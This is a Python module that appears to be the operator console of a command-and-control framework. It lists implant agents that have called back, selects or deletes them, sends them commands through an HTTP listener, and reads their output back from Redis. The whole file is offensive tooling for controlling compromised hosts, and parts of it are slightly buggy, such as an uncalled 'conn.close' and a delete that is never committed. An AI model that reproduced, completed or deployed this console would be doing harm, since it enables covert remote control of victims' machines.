import redis
import requests
import os
import time
import sqlite3

RED = "\033[1;31m"
GREEN = "\033[1;92m"
CYAN = "\033[1;36m"
RESET = "\033[0m"

script_dir = os.path.dirname(os.path.abspath(__file__))
db_path = os.path.join(script_dir, '..', 'Listeners', 'http', 'agents.db')

r = redis.Redis(host='127.0.0.1', port=6379, db=0, decode_responses=True)

header = {"Content-Type": "application/json"}


def send_cmd(url, cmd):
    if os.getenv('UUID'):
        id = os.getenv('UUID')
    else:
        print(f"{RED}Agent UUID not set yet!{RESET}")
        return

    json_payload = {"uuid": id, "command": cmd}
    response = requests.post(url, json=json_payload, headers=header)
    
    raw_cmd = cmd.split(" ", 1)
    if raw_cmd[0] == "exit":
        return
    elif raw_cmd[0] == "sleep":
        return
    elif response.status_code == 200:
        key = f"{os.getenv('UUID')}-output"
        while True:
            if r.exists(key):
                bruh = r.lindex(key, -1)
                #print("Data sent confirmed: ", key)
                output = r.rpop(key)
                print(output)
                break
            else:
                time.sleep(1)
                continue


def agents(*agrs):
    conn = sqlite3.connect(db_path)
    cur = conn.cursor()
    sql_select = """SELECT uuid, name, status FROM agents"""
    cur.execute(sql_select)
    result = cur.fetchall()
    conn.close()

    if not result:
        print(f"{CYAN}No Callbacks Yet!{RESET}")
        return

    for index, row in enumerate(result):
        print(f"{index}) {row[1]} --> Status: {row[2]}")
    
    try:
        agent_index = int(input(f"{CYAN}Select an Agent: {RESET}"))
        if agent_index > len(result) - 1:
            print(f"{RED}ERROR: Invalid agent index {RESET}")
            return
    except ValueError:
        print(f"{RED}ERROR: Input must be a number {RESET}")
        return
    os.environ['UUID'] = result[agent_index][0]


def uuid(*args):
    id = os.getenv('UUID')
    print(f"{CYAN}Current UUID: {RESET}{id}")


def history(length):
    if length:
        tmp = int(length)
        index = -tmp
    else:
        index = 1
    raw = r.lrange(os.getenv('UUID'), index, -1)
    hist = []
    for i in range(len(raw)):
        if raw[i] != "SEEN" and raw[i] != "AGENT REGISTERED":
            hist.append(raw[i])
    
    for i in range(len(hist)):
        print(f'{i}) {hist[i]}')


def clear(*args):
    os.system("clear")


def delete(name):
    # Check if they pass an argument
    conn = sqlite3.connect(db_path)
    cur = conn.cursor()

    if name:
        cur.execute("SELECT uuid FROM agents where name = ?", (name,))
        uuid = cur.fetchone()
        cur.execute("DELETE FROM agents WHERE uuid = ?", (uuid,))
        if os.getenv('UUID') and uuid == os.environ['UUID']:
            del os.environ['UUID']
    else:
        cur.execute("SELECT uuid, name, status FROM agents")
        agent_list = cur.fetchall()

        for index, row in enumerate(agent_list):
            print(f"{index}) {row[1]} --> {row[2]}")
        
        try: 
            agent_index = int(input(f"{CYAN}Select an Agent to Delete: {RESET}"))
            if agent_index > len(agent_list) - 1:
                print(f"{RED}ERROR: Invalid agent index {RESET}")
                return
        except ValueError:
            print(f"{RED}ERROR: Input must be a number {RESET}")
            return

        sql_delete = "DELETE FROM agents WHERE uuid = ?"
        uuid = agent_list[agent_index][0]
        cur.execute(sql_delete, (uuid,))
        conn.commit()
        conn.close
        if os.getenv('UUID') and uuid == os.environ['UUID']:
            del os.environ['UUID']